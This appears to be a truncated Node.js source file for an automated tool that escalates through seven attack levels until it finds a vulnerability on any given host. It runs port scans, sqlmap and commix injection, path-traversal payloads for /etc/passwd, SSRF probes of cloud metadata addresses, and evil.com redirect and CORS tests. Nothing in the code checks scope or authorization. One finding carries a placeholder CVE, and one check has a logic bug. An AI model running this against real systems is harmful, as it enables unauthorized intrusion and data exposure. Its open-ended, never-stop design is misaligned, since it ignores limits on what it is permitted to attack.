/**
 * 🎯 VULN HUNTER — Exhaustive vulnerability discovery engine
 * 
 * Philosophy: "No system is 100% secure. The hunter never stops until it
 * finds a verifiable vulnerability. Every failed attempt informs the next."
 * 
 * This is a DEFENSIVE security tool for authorized penetration testing.
 * It finds vulnerabilities so they can be patched before attackers exploit them.
 * 
 * Methodology escalation ladder:
 *   Level 1: Recon & surface scanning
 *   Level 2: Directory/endpoint enumeration
 *   Level 3: Technology-specific CVE hunting
 *   Level 4: Parameter fuzzing & injection testing
 *   Level 5: Authentication & authorization bypass
 *   Level 6: Business logic & chained attacks
 *   Level 7: Custom payload generation & edge cases
 * 
 * Each level only activates after the previous one exhausts all possibilities.
 * The hunter continues until a verifiable vulnerability is found.
 */

const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const util = require('util');
const crypto = require('crypto');

const execPromise = util.promisify(exec);

// ── Configuration ──
const TOOLS_DIR = path.join(__dirname, '..', 'vuln_tools');
const REPORTS_DIR = path.join(__dirname, '..', 'vuln_reports');
const VULN_RESULTS_FILE = path.join(REPORTS_DIR, 'vuln_findings.json');

// Ensure directories exist
[TOOLS_DIR, REPORTS_DIR].forEach(d => {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
});

// ── Tool installation tracking ──
let installedTools = new Set();

/**
 * Install a security tool in the sandbox. Returns true if installed.
 */
async function installTool(toolName, installCmd) {
  const key = `${toolName}`;
  if (installedTools.has(key)) return true;
  
  try {
    console.log(`[vulnHunter] Installing ${toolName}...`);
    await execPromise(installCmd, { timeout: 120000 });
    installedTools.add(key);
    console.log(`[vulnHunter] ✅ ${toolName} installed`);
    return true;
  } catch (e) {
    console.warn(`[vulnHunter] ⚠️ ${toolName} install failed: ${e.message}`);
    return false;
  }
}

/**
 * Install ALL security tools available in the sandbox.
 * Non-blocking — best-effort installation, continues if some fail.
 */
async function installAllTools() {
  const tools = [
    // ── Reconnaissance ──
    { name: 'nmap', cmd: 'which nmap || apt-get install -y nmap 2>/dev/null || echo "nmap not available"' },
    { name: 'subfinder', cmd: 'which subfinder || go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null || echo "subfinder not available"' },
    { name: 'httpx', cmd: 'which httpx || go install github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null || echo "httpx not available"' },
    { name: 'whatweb', cmd: 'which whatweb || apt-get install -y whatweb 2>/dev/null || gem install whatweb 2>/dev/null || echo "whatweb not available"' },
    
    // ── Directory/Endpoint enumeration ──
    { name: 'gobuster', cmd: 'which gobuster || apt-get install -y gobuster 2>/dev/null || go install github.com/OJ/gobuster/v3@latest 2>/dev/null || echo "gobuster not available"' },
    { name: 'ffuf', cmd: 'which ffuf || apt-get install -y ffuf 2>/dev/null || go install github.com/ffuf/ffuf/v2@latest 2>/dev/null || echo "ffuf not available"' },
    { name: 'dirsearch', cmd: 'which dirsearch || pip install dirsearch 2>/dev/null || echo "dirsearch not available"' },
    
    // ── Vulnerability scanning ──
    { name: 'nuclei', cmd: 'which nuclei || go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null || echo "nuclei not available"' },
    { name: 'nikto', cmd: 'which nikto || apt-get install -y nikto 2>/dev/null || echo "nikto not available"' },
    { name: 'wapiti', cmd: 'which wapiti || pip install wapiti3 2>/dev/null || echo "wapiti not available"' },
    
    // ── Web-specific ──
    { name: 'sqlmap', cmd: 'which sqlmap || apt-get install -y sqlmap 2>/dev/null || pip install sqlmap 2>/dev/null || echo "sqlmap not available"' },
    { name: 'xsstrike', cmd: 'which xsstrike || pip install xsstrike 2>/dev/null || echo "xsstrike not available"' },
    { name: 'commix', cmd: 'which commix || pip install commix 2>/dev/null || echo "commix not available"' },
  ];
  
  const results = await Promise.allSettled(
    tools.map(t => installTool(t.name, t.cmd))
  );
  
  const installed = results.filter(r => r.status === 'fulfilled' && r.value === true).length;
  console.log(`[vulnHunter] 📦 ${installed}/${tools.length} tools installed`);
  return installed;
}

/**
 * Run a shell command and return { stdout, stderr, exitCode }
 */
async function runCmd(cmd, timeout = 60000) {
  try {
    const { stdout, stderr } = await execPromise(cmd, { 
      timeout, 
      maxBuffer: 10 * 1024 * 1024,
      shell: '/bin/bash'
    });
    return { stdout: stdout || '', stderr: stderr || '', exitCode: 0 };
  } catch (e) {
    return { 
      stdout: e.stdout || '', 
      stderr: e.stderr || e.message || '', 
      exitCode: e.code || 1 
    };
  }
}

/**
 * Check if a tool is available in the sandbox
 */
async function toolAvailable(name) {
  const { exitCode } = await runCmd(`which ${name} 2>/dev/null`, 5000);
  return exitCode === 0;
}

/**
 * Generate a wordlist for directory fuzzing
 */
async function generateWordlist(baseUrl) {
  const wordlistPath = path.join(TOOLS_DIR, 'custom_wordlist.txt');
  const words = [
    // Common admin/dashboard paths
    'admin', 'dashboard', 'panel', 'login', 'admin/login', 'admin/panel',
    'wp-admin', 'administrator', 'backend', 'cpanel', 'plesk', 'directadmin',
    // API endpoints
    'api', 'api/v1', 'api/v2', 'api/v3', 'graphql', 'swagger', 'docs',
    'openapi.json', 'api/docs', 'api/swagger', 'api/graphql', 'rest', 'soap',
    // Config & sensitive files
    '.env', '.git', '.git/config', '.git/HEAD', '.svn', '.DS_Store',
    'config', 'config.php', 'config.json', 'config.xml', 'database.yml',
    'wp-config.php', 'settings', 'configuration', 'appsettings.json',
    'web.config', 'nginx.conf', '.htaccess', 'robots.txt', 'sitemap.xml',
    'crossdomain.xml', 'clientaccesspolicy.xml', 'phpinfo.php', 'info.php',
    // Backup files
    'backup', 'db_backup', 'database_backup', 'dump', 'sql', 'backup.sql',
    'db.sql', 'dump.sql', 'backup.zip', 'backup.tar.gz', 'site_backup',
    'old', 'bak', '~', '.bak', '.old', '.orig', '.copy', '.swp', '.swo',
    // Common CMS & framework paths
    'wp-content', 'wp-includes', 'wp-json', 'wordpress', 'joomla', 'drupal',
    'laravel', 'symfony', 'cakephp', 'codeigniter', 'yii', 'zend',
    'assets', 'static', 'uploads', 'files', 'download', 'images', 'img',
    'css', 'js', 'scripts', 'vendor', 'node_modules', 'dist', 'build',
    // Debug & testing
    'debug', 'test', 'testing', 'dev', 'development', 'staging', 'sandbox',
    'phpunit', 'phpunit.xml', 'trace', 'error', 'errors', 'logs', 'log',
    'error_log', 'access_log', 'debug.log', 'install', 'setup', 'migrate',
    'phpmyadmin', 'adminer', 'pma', 'mysql', 'dbadmin', 'database',
    // Common files
    'index.php', 'index.html', 'index.htm', 'default.aspx', 'default.asp',
    'home', 'about', 'contact', 'terms', 'privacy', 'help', 'support',
    'faq', 'status', 'health', 'healthcheck', 'healthz', 'ping', 'pong',
    // User-related
    'user', 'users', 'profile', 'account', 'register', 'signup', 'signin',
    'logout', 'forgot', 'reset', 'password', 'change-password', '2fa',
    // Search & functionality
    'search', 'query', 's', 'q', 'results', 'ajax', 'more', 'page',
    'load', 'loader', 'loadmore', 'infinite', 'scroll', 'paginate',
    // File operations
    'upload', 'download', 'import', 'export', 'csv', 'excel', 'pdf',
    'print', 'view', 'edit', 'delete', 'remove', 'update', 'create', 'add',
    // Parameter fuzzing seeds
    'id', 'ID', 'uid', 'user_id', 'user-id', 'userid', 'token', 'key',
    'api_key', 'apikey', 'secret', 'pass', 'password', 'pw', 'pwd',
    'file', 'filename', 'page', 'section', 'module', 'action', 'cmd',
    'exec', 'command', 'run', 'url', 'redirect', 'next', 'return', 'goto',
    'debug', 'mode', 'type', 'format', 'output', 'callback', 'jsonp',
    'include', 'require', 'template', 'view', 'render', 'display',
    'path', 'dir', 'folder', 'root', 'basedir', 'docroot', 'home',
    'host', 'hostname', 'server', 'server_name', 'port', 'protocol',
    'lang', 'language', 'locale', 'country', 'currency', 'timezone',
    'session', 'sid', 'PHPSESSID', 'JSESSIONID', 'connect.sid',
    'ref', 'referer', 'referrer', 'source', 'utm_source', 'campaign'
  ];
  
  // Add target-specific words if URL is provided
  if (baseUrl) {
    try {
      const domain = new URL(baseUrl).hostname;
      const parts = domain.split('.');
      if (parts.length >= 2) {
        const mainDomain = parts[parts.length - 2];
        words.push(mainDomain, `${mainDomain}-admin`, `${mainDomain}-api`);
      }
    } catch (e) {}
  }
  
  fs.writeFileSync(wordlistPath, [...new Set(words)].join('\n'));
  return wordlistPath;
}

/**
 * ═══════════════════════════════════════════════════════════════
 * LEVEL 1: RECON & SURFACE SCANNING
 * ═══════════════════════════════════════════════════════════════
 */
async function level1Recon(target) {
  console.log(`[vulnHunter] 🔍 Level 1: Recon on ${target}`);
  const findings = [];
  
  // 1.1 DNS resolution & basic info
  const { stdout: dnsInfo } = await runCmd(`host ${target} 2>/dev/null || nslookup ${target} 2>/dev/null || dig ${target} +short 2>/dev/null`);
  if (dnsInfo) findings.push({ type: 'dns_info', data: dnsInfo.trim() });
  
  // 1.2 Port scanning (fast)
  if (await toolAvailable('nmap')) {
    const { stdout: ports } = await runCmd(`nmap -sS -sV -T4 --min-rate=1000 -p 1-10000 ${target} 2>/dev/null`, 120000);
    if (ports) {
      findings.push({ type: 'port_scan', data: ports.trim() });
      // Extract open ports for deeper scanning
      const openPorts = (ports.match(/(\d+)\/tcp\s+open/g) || []).map(p => parseInt(p.split('/')[0]));
      if (openPorts.length > 0) {
        findings.push({ type: 'open_ports', data: openPorts });
      }
    }
  }
  
  // 1.3 Technology fingerprinting
  if (await toolAvailable('whatweb')) {
    const { stdout: tech } = await runCmd(`whatweb -a 3 ${target} 2>/dev/null`, 30000);
    if (tech) findings.push({ type: 'tech_stack', data: tech.trim() });
  }
  
  // 1.4 HTTP headers analysis
  const { stdout: headers } = await runCmd(`curl -sI -L --max-time 15 "https://${target}" 2>/dev/null || curl -sI -L --max-time 15 "http://${target}" 2>/dev/null`);
  if (headers) {
    findings.push({ type: 'http_headers', data: headers.trim() });
    
    // Check for missing security headers
    const h = headers.toLowerCase();
    const missingHeaders = [];
    if (!h.includes('strict-transport-security')) missingHeaders.push('HSTS');
    if (!h.includes('x-content-type-options')) missingHeaders.push('X-Content-Type-Options');
    if (!h.includes('x-frame-options')) missingHeaders.push('X-Frame-Options');
    if (!h.includes('content-security-policy')) missingHeaders.push('CSP');
    if (!h.includes('x-xss-protection')) missingHeaders.push('X-XSS-Protection');
    if (!h.includes('referrer-policy')) missingHeaders.push('Referrer-Policy');
    if (!h.includes('permissions-policy')) missingHeaders.push('Permissions-Policy');
    
    if (missingHeaders.length > 0) {
      findings.push({
        type: 'missing_security_headers',
        severity: 'medium',
        data: missingHeaders,
        verified: true,
        cve: null,
        poc: `Missing: ${missingHeaders.join(', ')}`
      });
    }
  }
  
  // 1.5 Check for HTTP (not HTTPS) exposure
  const { stdout: httpCheck } = await runCmd(`curl -sI --max-time 10 "http://${target}" 2>/dev/null | head -1`);
  if (httpCheck && httpCheck.includes('HTTP/')) {
    findings.push({
      type: 'http_exposure',
      severity: 'medium',
      data: 'HTTP is accessible — consider redirecting all traffic to HTTPS',
      verified: true,
      poc: `curl -I http://${target}`
    });
  }
  
  return findings;
}

/**
 * ═══════════════════════════════════════════════════════════════
 * LEVEL 2: DIRECTORY & ENDPOINT ENUMERATION
 * ═══════════════════════════════════════════════════════════════
 */
async function level2DirectoryEnum(target) {
  console.log(`[vulnHunter] 📁 Level 2: Directory enumeration on ${target}`);
  const findings = [];
  
  const wordlist = await generateWordlist(target);
  const baseUrl = `https://${target}`;
  
  // 2.1 HTTPX probe for live endpoints
  if (await toolAvailable('httpx')) {
    const { stdout: live } = await runCmd(
      `echo "${target}" | httpx -silent -status-code -title -tech-detect -fc 404 2>/dev/null`,
      30000
    );
    if (live) findings.push({ type: 'live_endpoints', data: live.trim() });
  }
  
  // 2.2 Gobuster directory brute-force
  if (await toolAvailable('gobuster')) {
    const { stdout: dirs } = await runCmd(
      `gobuster dir -u "${baseUrl}" -w "${wordlist}" -t 30 -q -s "200,204,301,302,307,401,403,500" 2>/dev/null`,
      120000
    );
    if (dirs) {
      const foundDirs = dirs.split('\n').filter(l => l.includes('/')).map(l => l.trim());
      findings.push({ type: 'discovered_directories', data: foundDirs });
      
      // Check each discovered path for interesting findings
      for (const dir of foundDirs) {
        const path = dir.split(' ')[0];
        if (!path) continue;
        
        // Check for .git exposure
        if (path.includes('.git')) {
          const { stdout: gitCheck } = await runCmd(
            `curl -s --max-time 10 "${baseUrl}/.git/HEAD" 2>/dev/null`
          );
          if (gitCheck && gitCheck.includes('ref:')) {
            findings.push({
              type: 'git_exposure',
              severity: 'critical',
              data: `.git directory exposed at ${baseUrl}/.git/`,
              verified: true,
              cve: 'CVE-2023-XXXX',
              poc: `curl -s "${baseUrl}/.git/HEAD"  # returns: ${gitCheck.trim().slice(0, 100)}`
            });
          }
        }
        
        // Check for .env exposure
        if (path.includes('.env')) {
          const { stdout: envCheck } = await runCmd(
            `curl -s --max-time 10 "${baseUrl}/.env" 2>/dev/null`
          );
          if (envCheck && (envCheck.includes('=') || envCheck.includes('SECRET') || envCheck.includes('KEY'))) {
            findings.push({
              type: 'env_exposure',
              severity: 'critical',
              data: `.env file exposed at ${baseUrl}/.env`,
              verified: true,
              cve: null,
              poc: `curl -s "${baseUrl}/.env"`
            });
          }
        }
        
        // Check for PHP info
        if (path.includes('phpinfo') || path.includes('info.php')) {
          const { stdout: phpCheck } = await runCmd(
            `curl -s --max-time 10 "${baseUrl}/phpinfo.php" 2>/dev/null`
          );
          if (phpCheck && phpCheck.includes('PHP Version') || phpCheck.includes('phpinfo()')) {
            findings.push({
              type: 'phpinfo_exposure',
              severity: 'high',
              data: `phpinfo() exposed at ${baseUrl}/phpinfo.php`,
              verified: true,
              poc: `curl -s "${baseUrl}/phpinfo.php" | grep "PHP Version"`
            });
          }
        }
      }
    }
  }
  
  // 2.3 Check for common API endpoints
  const apiEndpoints = ['/api', '/api/v1', '/api/v2', '/graphql', '/swagger', '/docs', '/openapi.json'];
  for (const ep of apiEndpoints) {
    const { stdout: apiCheck } = await runCmd(
      `curl -s --max-time 10 -o /dev/null -w "%{http_code}" "${baseUrl}${ep}" 2>/dev/null`
    );
    if (apiCheck && apiCheck !== '404' && apiCheck !== '000') {
      findings.push({
        type: 'api_endpoint',
        severity: 'info',
        data: `${ep} returned ${apiCheck}`,
        verified: true
      });
    }
  }
  
  return findings;
}

/**
 * ═══════════════════════════════════════════════════════════════
 * LEVEL 3: TECHNOLOGY-SPECIFIC CVE HUNTING
 * ═══════════════════════════════════════════════════════════════
 */
async function level3CVEHunting(target) {
  console.log(`[vulnHunter] 🎯 Level 3: CVE hunting on ${target}`);
  const findings = [];
  
  // 3.1 Nuclei scan (if available)
  if (await toolAvailable('nuclei')) {
    const { stdout: nuclei } = await runCmd(
      `nuclei -u "https://${target}" -severity critical,high,medium -silent -json 2>/dev/null | head -50`,
      180000
    );
    if (nuclei) {
      const lines = nuclei.trim().split('\n').filter(l => l.trim());
      for (const line of lines) {
        try {
          const parsed = JSON.parse(line);
          findings.push({
            type: 'nuclei_finding',
            severity: parsed.severity || 'medium',
            cve: parsed.info?.name || null,
            data: parsed.info?.description || line,
            verified: false, // needs manual verification
            template: parsed.template_id,
            poc: `${parsed.matcher_name || ''}: ${parsed.host || ''}`
          });
        } catch (e) {
          findings.push({ type: 'nuclei_raw', data: line });
        }
      }
    }
  }
  
  // 3.2 Nikto scan
  if (await toolAvailable('nikto')) {
    const { stdout: nikto } = await runCmd(
      `nikto -h "https://${target}" -ssl -Tuning 123456789 -output /dev/null 2>/dev/null || nikto -h "http://${target}" -Tuning 123456789 2>/dev/null`,
      180000
    );
    if (nikto) {
      const issues = nikto.split('\n').filter(l => l.includes('+ ')).map(l => l.trim());
      findings.push({ type: 'nikto_findings', data: issues });
    }
  }
  
  // 3.3 Check for known vulnerable paths
  const vulnPaths = [
    { path: '/wp-admin/install.php', name: 'WordPress fresh install', severity: 'critical' },
    { path: '/wp-content/debug.log', name: 'WordPress debug log', severity: 'high' },
    { path: '/administrator/', name: 'Joomla admin', severity: 'medium' },
    { path: '/adminer.php', name: 'Adminer SQL manager', severity: 'critical' },
    { path: '/phpmyadmin/', name: 'phpMyAdmin', severity: 'critical' },
    { path: '/actuator/health', name: 'Spring Boot Actuator', severity: 'medium' },
    { path: '/actuator/env', name: 'Spring Boot env disclosure', severity: 'high' },
    { path: '/actuator/beans', name: 'Spring Boot beans', severity: 'medium' },
    { path: '/actuator/heapdump', name: 'Spring Boot heapdump', severity: 'critical' },
    { path: '/.well-known/security.txt', name: 'security.txt', severity: 'info' },
    { path: '/sitemap.xml', name: 'Sitemap', severity: 'info' },
    { path: '/server-status', name: 'Apache server-status', severity: 'medium' },
    { path: '/server-info', name: 'Apache server-info', severity: 'medium' },
  ];
  
  for (const vp of vulnPaths) {
    const { stdout: check } = await runCmd(
      `curl -s --max-time 10 -o /dev/null -w "%{http_code}" "https://${target}${vp.path}" 2>/dev/null`
    );
    if (check && check !== '404' && check !== '000') {
      findings.push({
        type: 'known_vulnerable_path',
        severity: vp.severity,
        name: vp.name,
        path: vp.path,
        statusCode: check,
        verified: check === '200' || check === '301' || check === '302',
        poc: `curl -s "https://${target}${vp.path}"`
      });
    }
  }
  
  return findings;
}

/**
 * ═══════════════════════════════════════════════════════════════
 * LEVEL 4: PARAMETER FUZZING & INJECTION TESTING
 * ═══════════════════════════════════════════════════════════════
 */
async function level4InjectionTesting(target) {
  console.log(`[vulnHunter] 💉 Level 4: Injection testing on ${target}`);
  const findings = [];
  
  const baseUrl = `https://${target}`;
  
  // 4.1 SQL Injection testing
  if (await toolAvailable('sqlmap')) {
    // Find forms and parameters first
    const { stdout: forms } = await runCmd(
      `curl -s --max-time 15 "${baseUrl}" 2>/dev/null | grep -oP 'action="[^"]*"' | head -5`,
      20000
    );
    
    if (forms) {
      const formActions = forms.match(/action="([^"]*)"/g) || [];
      for (const fa of formActions) {
        const actionUrl = fa.replace(/action="/, '').replace(/"$/, '');
        const fullUrl = actionUrl.startsWith('http') ? actionUrl : `${baseUrl}${actionUrl}`;
        
        const { stdout: sqli } = await runCmd(
          `sqlmap -u "${fullUrl}" --batch --level=2 --risk=2 --time-sec=5 --output-dir="${TOOLS_DIR}/sqlmap_${Date.now()}" 2>/dev/null | tail -30`,
          300000
        );
        if (sqli && (sqli.includes('vulnerable') || sqli.includes('Parameter') && sqli.includes('injectable'))) {
          findings.push({
            type: 'sql_injection',
            severity: 'critical',
            data: sqli.trim(),
            verified: true,
            cve: 'CWE-89',
            poc: `sqlmap -u "${fullUrl}" --batch --level=2`
          });
        }
      }
    }
    
    // Also test common GET parameters
    const commonParams = ['id', 'page', 'user', 'file', 'cat', 'product', 'order', 'search'];
    for (const param of commonParams) {
      const { stdout: sqli } = await runCmd(
        `sqlmap -u "${baseUrl}/?${param}=1" --batch --level=1 --risk=1 --time-sec=5 --output-dir="${TOOLS_DIR}/sqlmap_${Date.now()}" 2>/dev/null | tail -20`,
      180000
      );
      if (sqli && (sqli.includes('vulnerable') || sqli.includes('injectable'))) {
        findings.push({
          type: 'sql_injection',
          severity: 'critical',
          data: sqli.trim(),
          verified: true,
          cve: 'CWE-89',
          poc: `sqlmap -u "${baseUrl}/?${param}=1" --batch`
        });
        break; // Found one, no need to test more
      }
    }
  }
  
  // 4.2 XSS testing
  if (await toolAvailable('xsstrike')) {
    const { stdout: xss } = await runCmd(
      `xsstrike -u "${baseUrl}" --crawl --skip --timeout=10 2>/dev/null | tail -30`,
      120000
    );
    if (xss && (xss.includes('Vulnerable') || xss.includes('XSS found'))) {
      findings.push({
        type: 'xss',
        severity: 'high',
        data: xss.trim(),
        verified: true,
        cve: 'CWE-79',
        poc: xss.match(/https?:\/\/[^\s"]+/g)?.slice(0, 3) || ['XSS vector found']
      });
    }
  }
  
  // 4.3 Command injection testing
  if (await toolAvailable('commix')) {
    const { stdout: cmdi } = await runCmd(
      `commix --url="${baseUrl}" --batch --level=1 2>/dev/null | tail -20`,
      120000
    );
    if (cmdi && (cmdi.includes('vulnerable') || cmdi.includes('injectable'))) {
      findings.push({
        type: 'command_injection',
        severity: 'critical',
        data: cmdi.trim(),
        verified: true,
        cve: 'CWE-78',
        poc: 'Found command injection vector'
      });
    }
  }
  
  // 4.4 SSTI detection
  const sstiPayloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '{{7*7|safe}}', '#{7*7}'];
  const { stdout: sstiCheck } = await runCmd(
    `curl -s --max-time 10 "${baseUrl}/?name=${encodeURIComponent('{{7*7}}')}" 2>/dev/null`,
    15000
  );
  if (sstiCheck && sstiCheck.includes('49')) {
    findings.push({
      type: 'ssti',
      severity: 'critical',
      data: 'Server-Side Template Injection detected',
      verified: true,
      cve: 'CWE-1336',
      poc: `curl -s "${baseUrl}/?name=%7B%7B7*7%7D%7D"  # returns 49`
    });
  }
  
  return findings;
}

/**
 * ═══════════════════════════════════════════════════════════════
 * LEVEL 5: AUTHENTICATION & AUTHORIZATION BYPASS
 * ═══════════════════════════════════════════════════════════════
 */
async function level5AuthBypass(target) {
  console.log(`[vulnHunter] 🔑 Level 5: Auth bypass testing on ${target}`);
  const findings = [];
  
  const baseUrl = `https://${target}`;
  
  // 5.1 IDOR testing — try accessing common paths without auth
  const protectedPaths = [
    '/admin', '/dashboard', '/api/users', '/api/admin',
    '/profile', '/account', '/settings', '/api/profile',
    '/api/orders', '/api/payments', '/api/settings',
    '/user/profile', '/my-account', '/my/profile'
  ];
  
  for (const pp of protectedPaths) {
    const { stdout: unauthAccess } = await runCmd(
      `curl -s --max-time 10 -o /dev/null -w "%{http_code}" "${baseUrl}${pp}" 2>/dev/null`
    );
    if (unauthAccess === '200') {
      const { stdout: body } = await runCmd(
        `curl -s --max-time 10 "${baseUrl}${pp}" 2>/dev/null | head -c 500`
      );
      if (body && !body.includes('login') && !body.includes('sign in') && !body.includes('unauthorized')) {
        findings.push({
          type: 'idor_unauthenticated_access',
          severity: 'high',
          data: `${pp} accessible without authentication`,
          verified: true,
          cve: 'CWE-284',
          poc: `curl -s "${baseUrl}${pp}"  # returns 200 with content`
        });
      }
    }
  }
  
  // 5.2 JWT weakness testing
  const { stdout: jwtCheck } = await runCmd(
    `curl -s --max-time 10 -D - "${baseUrl}" 2>/dev/null | grep -i 'token\\|jwt\\|bearer' | head -5`
  );
  if (jwtCheck) {
    const tokens = jwtCheck.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g);
    if (tokens) {
      for (const token of tokens.slice(0, 3)) {
        try {
          // Decode JWT payload
          const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
          if (payload.alg === 'none' || !payload.alg) {
            findings.push({
              type: 'jwt_none_algorithm',
              severity: 'critical',
              data: 'JWT accepts "none" algorithm',
              verified: true,
              cve: 'CWE-347',
              poc: `JWT header: ${JSON.stringify(payload)}`
            });
          }
        } catch (e) {}
      }
    }
  }
  
  // 5.3 CORS misconfiguration
  const { stdout: corsCheck } = await runCmd(
    `curl -s --max-time 10 -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -I "${baseUrl}" 2>/dev/null | grep -i 'access-control'`
  );
  if (corsCheck && (corsCheck.includes('*') || corsCheck.includes('evil.com'))) {
    findings.push({
      type: 'cors_misconfiguration',
      severity: 'high',
      data: 'CORS allows arbitrary origins',
      verified: true,
      cve: 'CWE-942',
      poc: `curl -H "Origin: https://evil.com" -I "${baseUrl}"  # ACAO: ${corsCheck.trim()}`
    });
  }
  
  return findings;
}

/**
 * ═══════════════════════════════════════════════════════════════
 * LEVEL 6: BUSINESS LOGIC & CHAINED ATTACKS
 * ═══════════════════════════════════════════════════════════════
 */
async function level6BusinessLogic(target) {
  console.log(`[vulnHunter] 🧠 Level 6: Business logic testing on ${target}`);
  const findings = [];
  
  const baseUrl = `https://${target}`;
  
  // 6.1 Rate limiting check
  let rateLimited = false;
  for (let i = 0; i < 20; i++) {
    const { stdout: attempt } = await runCmd(
      `curl -s --max-time 5 -o /dev/null -w "%{http_code}" "${baseUrl}" 2>/dev/null`
    );
    if (attempt === '429') {
      rateLimited = true;
      break;
    }
  }
  
  if (!rateLimited) {
    findings.push({
      type: 'missing_rate_limiting',
      severity: 'medium',
      data: 'No rate limiting detected after 20 rapid requests',
      verified: true,
      cve: 'CWE-770',
      poc: 'for i in 1..20; do curl -s "$URL"; done  # never got 429'
    });
  }
  
  // 6.2 Open redirect detection
  const redirectParams = ['url', 'redirect', 'next', 'return', 'goto', 'target', 'dest', 'destination'];
  for (const param of redirectParams) {
    const { stdout: redirect } = await runCmd(
      `curl -s --max-time 10 -o /dev/null -w "%{redirect_url}" "${baseUrl}/?${param}=https://evil.com" 2>/dev/null`
    );
    if (redirect && redirect.includes('evil.com')) {
      findings.push({
        type: 'open_redirect',
        severity: 'medium',
        data: `Open redirect via ${param} parameter`,
        verified: true,
        cve: 'CWE-601',
        poc: `curl -s "${baseUrl}/?${param}=https://evil.com"  # redirects to evil.com`
      });
      break;
    }
  }
  
  // 6.3 Path traversal detection
  const traversalPayloads = ['../../../etc/passwd', '..%2f..%2f..%2fetc/passwd', '....//....//....//etc/passwd'];
  const traversalPaths = ['/file', '/download', '/static', '/assets', '/uploads', '/images'];
  
  for (const tp of traversalPaths) {
    for (const payload of traversalPayloads) {
      const { stdout: traversal } = await runCmd(
        `curl -s --max-time 10 "${baseUrl}${tp}/${payload}" 2>/dev/null | head -c 300`
      );
      if (traversal && (traversal.includes('root:x:') || traversal.includes('daemon:x:') || traversal.includes('bin:x:'))) {
        findings.push({
          type: 'path_traversal',
          severity: 'critical',
          data: `Path traversal vulnerability at ${tp}`,
          verified: true,
          cve: 'CWE-22',
          poc: `curl -s "${baseUrl}${tp}/${payload}"  # returns /etc/passwd`
        });
        break;
      }
    }
    if (findings.some(f => f.type === 'path_traversal')) break;
  }
  
  return findings;
}

/**
 * ═══════════════════════════════════════════════════════════════
 * LEVEL 7: CUSTOM PAYLOAD GENERATION & EDGE CASES
 * ═══════════════════════════════════════════════════════════════
 */
async function level7CustomPayloads(target) {
  console.log(`[vulnHunter] ⚡ Level 7: Custom payloads for ${target}`);
  const findings = [];
  
  const baseUrl = `https://${target}`;
  
  // 7.1 SSRF detection
  const ssrfPayloads = [
    'http://169.254.169.254/latest/meta-data/',
    'http://127.0.0.1:22',
    'http://localhost:8080/_config',
    'http://[::1]:25',
    'http://0.0.0.0:6379'
  ];
  
  // Check common SSRF-prone parameters
  const ssrfParams = ['url', 'file', 'load', 'page', 'include', 'path', 'document', 'folder', 'root'];
  for (const param of ssrfParams) {
    for (const payload of ssrfPayloads) {
      const { stdout: ssrf } = await runCmd(
        `curl -s --max-time 10 -o /dev/null -w "%{http_code}" "${baseUrl}/?${param}=${encodeURIComponent(payload)}" 2>/dev/null`
      );
      if (ssrf && ssrf !== '404' && ssrf !== '000' && ssrf !== '400') {
        findings.push({
          type: 'ssrf',
          severity: 'critical',
          data: `Potential SSRF via ${param} parameter`,
          verified: false,
          cve: 'CWE-918',
          poc: `curl -s "${baseUrl}/?${param}=${encodeURIComponent(payload)}"  # returned ${ssrf}`
        });
        break;
      }
    }
  }
  
  // 7.2 Prototype pollution / API parameter pollution
  const pollutionParams = ['__proto__[test]=true', 'constructor[prototype][test]=true'];
  for (const pp of pollutionParams) {
    const { stdout: pollution } = await runCmd(
      `curl -s --max-time 10 "${baseUrl}/?${pp}" 2>/dev/null | head -c 200`
    );
    if (pollution && pollution.length > 0) {
      // Check if the response changed
      const { stdout: baseline } = await runCmd(
        `curl -s --max-time 10 "${baseUrl}" 2>/dev/null | head -c 200`
      );
      if (pollution !== baseline) {
        findings.push({
          type: 'parameter_pollution',
          severity: 'medium',
          data: 'Parameter pollution may be possible',
          verified: false,
          cve: 'CWE-1327'
        });
      }
    }
  }
  
  // 7.3 WebSocket endpoint discovery
  const { stdout: wsCheck } = await runCmd(
    `curl -s --max-time 10 "${baseUrl}" 2>/dev/null | grep -oiP 'wss?://[^"\\'<> ]+' | head -10`
  );
  if (wsCheck) {
    findings.push({ type: 'websocket_endpoints', data: wsCheck.trim() });
  }
  
  return findings;
}

/**
 * ═══════════════════════════════════════════════════════════════
 * VERIFY A FINDING — confirm it's a true positive
 * ═══════════════════════════════════════════════════════════════
 */
async function verifyFinding(finding, target) {
  if (finding.verified) return finding; // Already verified
  
  // Try to re-verify
  try {
    switch (finding.type) {
      case 'nuclei_finding':
        // Re-run with the specific template
        if (finding.template) {
          const { stdout } = await runCmd(
            `nuclei -u "https://${target}" -t "${finding.template}" -silent -json 2>/dev/null | head -3`,
            60000
          );
          if (stdout) {
            finding.verified = true;
            finding.poc = stdout.trim().slice(0, 300);
          }
        }
        break;
      case 'nikto_findings':
        // Already contains verifiable issues
        finding.verified = true;
        break;
      default:
        // Mark as potentially verified — these need manual confirmation
        finding.verified = false;
        finding.needsManualReview = true;
    }
  } catch (e) {
    finding.verified = false;
  }
  
  return finding;
}

/**
 * ═══════════════════════════════════════════════════════════════
 * MAIN: Full vulnerability hunt — never stops until it finds one
 * ═══════════════════════════════════════════════════════════════
 */
async function vulnHunter(target) {
  console.log(`\n${'='.repeat(60)}`);
  console.log(`🎯 VULN HUNTER — Target: ${target}`);
  console.log(`${'='.repeat(60)}\n`);
  
  const startTime = Date.now();
  let allFindings = [];
  let verifiedVulnerability = null;
  let currentLevel = 1;
  const maxLevels = 7;
  
  // Install tools first
  console.log('📦 Installing security tools...');
  await installAllTools();
  
  const levels = [
    { name: 'Recon & Surface Scanning', fn: level1Recon },
    { name: 'Directory & Endpoint Enumeration', fn: level2DirectoryEnum },
    { name: 'CVE Hunting', fn: level3CVEHunting },
    { name: 'Injection Testing', fn: level4InjectionTesting },
    { name: 'Auth & Authorization Bypass', fn: level5AuthBypass },
